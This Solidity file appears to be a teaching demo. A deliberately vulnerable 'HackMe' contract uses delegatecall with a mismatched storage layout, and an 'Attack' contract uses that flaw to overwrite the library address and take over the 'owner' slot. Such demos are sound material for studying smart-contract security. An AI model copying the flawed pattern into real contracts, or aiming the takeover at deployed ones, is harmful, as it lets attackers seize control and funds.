// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract Lib {
    uint public someNumber;


    function doSomething(uint _num) public {
        someNumber = _num;
    }
}


contract HackMe {
    address public lib;
    address public owner;
    uint public someNumber;


    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }


    function doSomething(uint _num) public {
        (bool rent, ) = lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
        require(rent, "Failed to invoke HackMe.doSomething!");
    }
}

contract Attack {

    address public lib;
    address public owner;
    uint public someNumber;
    address public attacker;


    HackMe public hackMe;


    constructor(HackMe _hackMe) {
        hackMe = HackMe(_hackMe);
        attacker = msg.sender;
    }


    function attack() public {
        hackMe.doSomething(uint(uint160(address(this))));

        hackMe.doSomething(uint(uint160(attacker)));
    }

    function doSomething(uint _num) public {
        owner = address(uint160(_num));
    }
}